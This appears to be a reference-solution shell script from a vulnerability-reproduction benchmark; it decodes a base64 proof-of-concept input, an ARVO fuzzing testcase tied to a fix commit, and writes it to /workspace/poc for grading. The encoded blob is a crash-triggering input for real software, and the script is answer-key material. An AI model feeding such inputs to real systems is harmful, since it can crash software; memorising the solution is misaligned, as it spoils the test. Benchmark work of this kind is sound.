#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 362b34af addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
QAEB/wEAAAAA/5f///+UAKECAAAACgAAAAAAAAD58yQAAAAAAAAAAAAAAAAAOwEAgH4EBAAAAD8EJAYEAAAAAAMDegL3AAAEAgAAAPgAAFrgAgQCAAAAAAD2APcABAIAAAAA29vb29sAAPcABAAAAAAAAgAjAABABAIAJgEEAv0BAQEBAQEBAQQkBgQAAAAAAwMAAvcAAAQCAAAA+AAAAAAAAAAAAAEAAAAAAAAAJwAAAAAAADsBIIB+BAQAAAA/BCQAAACA/QEBAQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJwAAAAAAADsBAIB+BAQAAAA/BCQAAACA/QEBAQEBAQEB+gHIASYBBAIAAAAAAAAA
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
